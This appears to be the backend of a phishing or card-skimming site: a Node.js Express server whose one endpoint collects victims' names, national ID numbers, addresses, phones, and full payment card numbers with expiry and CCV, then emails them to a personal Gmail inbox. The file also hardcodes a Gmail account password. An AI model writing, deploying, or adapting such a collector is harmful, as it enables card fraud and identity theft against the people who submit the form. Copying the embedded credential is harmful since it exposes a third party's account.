const express = require('express');
const bodyParser = require('body-parser');
const nodemailer = require('nodemailer');
const cors = require('cors');

const app = express();

app.use(bodyParser.json());
app.use(cors());


const transporter = nodemailer.createTransport({
    service: 'gmail', 
    auth: {
        user: 'julissadedios24@gmail.com',
        pass: 'lqxm kpfs tysv kvmr'
    }
});


app.post('/send-email', (req, res) => {
    const { nombre, apellido, nac, cedula, direccion, ciudad, telefono, email, tarjeta } = req.body;

    const mailContent = `
        Nombre: ${nombre}
        Apellido: ${apellido}
        FechaNacimiento: ${nac}
        Cedula: ${cedula}
        Dirección: ${direccion}
        Ciudad: ${ciudad}
        Teléfono: ${telefono}
        Email: ${email}
        
        Tarjeta:
        - Número: ${tarjeta.numero}
        - Titular: ${tarjeta.titular}
        - Expiración: ${tarjeta.expiracion.mes}/${tarjeta.expiracion.anio}
        - CCV: ${tarjeta.ccv}
    `;

    console.log(mailContent)

    const mailOptions = {
        from: 'julissadedios24@gmail.com',
        to: 'manuelolavarrieta264@gmail.com',
        subject: `Nuevo mensaje de ${nombre} ${apellido}`,
        text: mailContent
    };

    transporter.sendMail(mailOptions, (error, info) => {
        if (error) {
            return res.status(500).send({ success: false, error });
        }
        res.send({ success: true, info });
    });
});

app.listen(3000, () => {
    console.log('Servidor corriendo en http://localhost:3000');
});
